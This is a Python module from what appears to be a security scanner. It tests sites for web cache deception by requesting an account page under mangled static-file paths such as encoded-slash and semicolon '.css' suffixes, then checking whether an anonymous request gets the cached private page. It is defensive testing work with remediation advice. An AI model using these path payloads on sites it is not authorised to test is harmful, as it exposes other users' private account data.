"""Stage 5: web cache deception (authenticated response cached as static).

Cache poisoning makes a shared cache serve attacker content. Deception is
the mirror image: a victim's browser fetches a URL that the application
treats as dynamic (their account page) but the cache treats as static
(extension-keyed), so the private response is stored under a key anyone can
request. The 2024 ChatGPT account-takeover class was this bug.

Proof needs three facts at once, and this module will not file without all
of them:

1. the path is private — an authenticated fetch returns account content that
   the anonymous fetch does not;
2. the private response is retrievable anonymously through a mangled static
   path (same body digest, no login form);
3. the cache itself served it — a HIT header, or an Age that grew.

Without an authenticated identity there is nothing to prove, so the module
skips rather than reporting a speculative "may be cacheable" lead. Only the
configured account's own page is ever cached; no third-party data is read.
"""

import hashlib
import re
import secrets

from core.auth_harness import AuthHarness, fingerprint_body
from modules.base import BaseModule
from tools.wrappers import curl

# Account pages every web app tends to have. Configured paths win.
DEFAULT_PRIVATE_PATHS = (
    "/account", "/profile", "/settings", "/dashboard", "/me",
    "/api/me", "/api/v1/me", "/my-account",
)

_HIT_SIGNALS = (
    "x-cache: hit", "x-proxy-cache: hit", "cf-cache-status: hit",
    "x-vercel-cache: hit", "x-cache-status: hit", "x-cache: tcp_hit",
)


def cache_hit_signal(headers_text: str) -> str:
    """The header proving a cache served this response, or "".

    Age counts: an Age above zero can only come from a stored copy. A
    MISS/EXPIRED marker is explicitly not a hit.
    """
    low = (headers_text or "").lower()
    for signal in _HIT_SIGNALS:
        if signal in low:
            return signal
    match = re.search(r"(?im)^age:\s*(\d+)\s*$", headers_text or "")
    if match and int(match.group(1)) > 0:
        return f"age: {match.group(1)}"
    return ""


def static_shapes(path: str, token: str) -> list:
    """Paths the origin may read as dynamic but the cache keys as static."""
    path = "/" + str(path or "").strip("/")
    name = f"wcd{token}.css"
    return [
        f"{path}/{name}",
        f"{path}/..%2f{name}",
        f"{path}%2f{name}",
        f"{path};{name}",
    ]


def body_digest(body: str) -> str:
    return hashlib.sha256((body or "").encode("utf-8", "replace")).hexdigest()


class CacheDeception(BaseModule):
    id = "cache_deception"
    name = "Web Cache Deception Probe"
    stage = 5
    detectability = "medium"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        cfg = self._cfg()
        if cfg.get("enabled", True) is False:
            self.state.skip_module(self.id, "disabled in config")
            return "skipped"

        harness = AuthHarness(self.config)
        await harness.establish_all(self.base_url)
        usable = harness.usable
        if not usable:
            self.state.skip_module(
                self.id, "no verified identity — cache deception is unprovable "
                         "without an authenticated response")
            return "skipped"

        identity = next((i for i in usable if not i.privileged), usable[0])
        self.log(f"  Using identity: {identity.name}")
        found = await self.probe(harness, identity)
        self.state.complete_module(self.id)
        self.log(f"  cache deception findings: {found}")
        return "done"

    async def probe(self, harness, identity) -> int:
        cfg = self._cfg()
        paths = cfg.get("private_paths") or DEFAULT_PRIVATE_PATHS
        try:
            max_paths = int(cfg.get("max_paths", 4) or 4)
            max_shapes = int(cfg.get("max_shapes", 3) or 3)
        except (TypeError, ValueError):
            max_paths, max_shapes = 4, 3
        reported = 0
        for path in [str(p) for p in paths][:max_paths]:
            if self.should_stop(reserve=15):
                break
            if await self._probe_path(harness, identity, path, max_shapes):
                reported += 1
        return reported

    async def _probe_path(self, harness, identity, path: str,
                          max_shapes: int) -> bool:
        auth = await self._fetch(harness, identity, path, authenticated=True)
        if not self._private_page(auth):
            return False
        anon = await self._fetch(harness, identity, path, authenticated=False)
        if body_digest(anon.get("body", "")) == body_digest(auth["body"]):
            return False  # public page, not private

        token = secrets.token_hex(4)
        for shape in static_shapes(path, token)[:max_shapes]:
            if self.should_stop(reserve=10):
                return False
            warm = await self._fetch(harness, identity, shape,
                                     authenticated=True)
            if not self._private_page(warm):
                continue
            if body_digest(warm.get("body", "")) != body_digest(auth["body"]):
                continue
            leaked = await self._fetch(harness, identity, shape,
                                       authenticated=False)
            if body_digest(leaked.get("body", "")) != body_digest(
                    auth["body"]):
                continue
            if fingerprint_body(leaked.get("body", ""))["has_login_form"]:
                continue
            # One more anonymous read: a first MISS followed by a HIT is the
            # cleanest proof that the edge stored the private page.
            confirm = await self._fetch(harness, identity, shape,
                                        authenticated=False)
            hit = (cache_hit_signal(confirm.get("headers", ""))
                   or cache_hit_signal(leaked.get("headers", "")))
            if not hit:
                continue

            marker = self._identity_marker(auth["body"], identity)
            self._file(path, shape, hit, marker, leaked, auth)
            return True
        return False

    async def _fetch(self, harness, identity, path: str,
                     *, authenticated: bool) -> dict:
        url = self.base_url.rstrip("/") + path
        try:
            if authenticated:
                result = await harness.request(
                    identity.name, url, output="full",
                    follow_redirects=False)
            else:
                result = await harness.request_anonymous(
                    url, output="full", follow_redirects=False)
        except Exception:
            return {"status": 0, "headers": "", "body": ""}
        return {
            "status": int(result.get("status") or 0),
            "headers": result.get("headers", "") or "",
            "body": result.get("body", "") or "",
        }

    @staticmethod
    def _private_page(response: dict) -> bool:
        body = response.get("body", "") or ""
        if response.get("status") != 200 or len(body) < 120:
            return False
        return not fingerprint_body(body)["has_login_form"]

    def _identity_marker(self, body: str, identity) -> str:
        """Which configured identity detail appears in the private page."""
        candidates = [getattr(identity, "email", ""),
                      getattr(identity, "owner_id", "")]
        candidates.extend(getattr(identity, "owner_markers", ()) or ())
        for value in candidates:
            value = str(value or "")
            if value and value in (body or ""):
                return value
        return ""

    def _file(self, path: str, shape: str, hit: str, marker: str,
              leaked: dict, auth: dict) -> None:
        url = self.base_url.rstrip("/") + shape
        self.state.add_finding(
            title=f"Web cache deception: authenticated {path} cached at {shape}",
            severity="HIGH",
            confidence="CONFIRMED",
            category="Web Cache Deception",
            description=(
                f"An authenticated request to {path} returned account content "
                f"that the anonymous request did not, and the same body was "
                f"then served anonymously from {shape} with the cache marking "
                f"`{hit}`. The cache keys the mangled URL as a static asset "
                "while the origin still routes it to the authenticated "
                "handler, so any visitor requesting that URL receives the "
                "logged-in user's page."
                + (f" The cached copy contains `{marker}`, identifying it as "
                   "the configured account's own page." if marker else "")),
            evidence=[
                f"Private path: {path}",
                f"Mangled path: {shape}",
                f"Anonymous retrieval: {url}",
                f"Cache signal: {hit}",
                f"Body digest: {body_digest(auth.get('body', ''))[:16]}",
                f"Identity marker: {marker or 'not present in body'}",
            ],
            remediation=(
                "Serve authenticated/dynamic responses with Cache-Control: "
                "private, no-store and Vary: Cookie; configure the edge cache "
                "to key on the normalized path and only cache allowlisted "
                "static extensions. Strip path parameters and encoded "
                "separators before the cache decision."),
            asset_keys=[f"url:{self.base_url.rstrip('/')}{path}"],
            verified=True,
            verification={
                "method": "authenticated_digest_match+anonymous_cache_hit",
                "private_path": path,
                "mangled_path": shape,
                "cache_signal": hit,
                "identity_marker": marker,
            },
        )

    def _cfg(self) -> dict:
        cfg = self.config.get("modules", {}).get(self.id, {})
        return cfg if isinstance(cfg, dict) else {}
